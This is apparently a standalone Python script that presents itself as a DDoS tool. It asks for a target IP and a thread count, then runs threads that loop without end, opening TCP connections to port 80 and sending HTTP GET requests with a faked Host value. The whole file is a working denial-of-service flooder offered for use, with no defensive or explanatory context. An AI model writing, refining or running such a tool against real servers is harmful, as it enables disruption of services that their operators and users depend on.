import socket
import colorama
import threading
import time
target = input(colorama.Back.BLACK+colorama.Fore.GREEN+"Enter the target IP you would like to DDoS: ")
if str.count(target,".") != 3:
    print(colorama.Back.BLACK+colorama.Fore.RED+"Invalid IP.")
    while str.count(target,".") != 3:
        target = input(colorama.Back.BLACK+colorama.Fore.GREEN+"Enter the target IP you would like to DDoS: ")
        if str.count(target,".") != 3:
            print(colorama.Back.BLACK+colorama.Fore.RED+"Invalid IP.")
threads = int(input(colorama.Back.BLACK+colorama.Fore.GREEN+"Amount of Threads: "))
if threads <= 0:
    print(colorama.Back.BLACK+colorama.Fore.RED+"Invalid number.")
    while threads == 0:
        threads = int(input(colorama.Back.BLACK+colorama.Fore.GREEN+"Amount of Threads: "))
        if threads == 0:
            print(colorama.Back.BLACK+colorama.Fore.RED+"Invalid number.")
myFakeIP = '182.21.20.32'
port = 80

def request():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        sock.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        sock.sendto(("Host: " + myFakeIP + "\r\n\r\n").encode('ascii'), (target, port))
        sock.close()


print(colorama.Back.BLACK+colorama.Fore.GREEN+"Press ENTER to begin DDoS.")
input(colorama.Back.BLACK+colorama.Fore.GREEN+"")


for am in range(threads):
    thread = threading.Thread(target=request)
    thread.start()
    print(colorama.Back.BLACK+colorama.Fore.GREEN+"Thread number "+str(am)+" has been started.")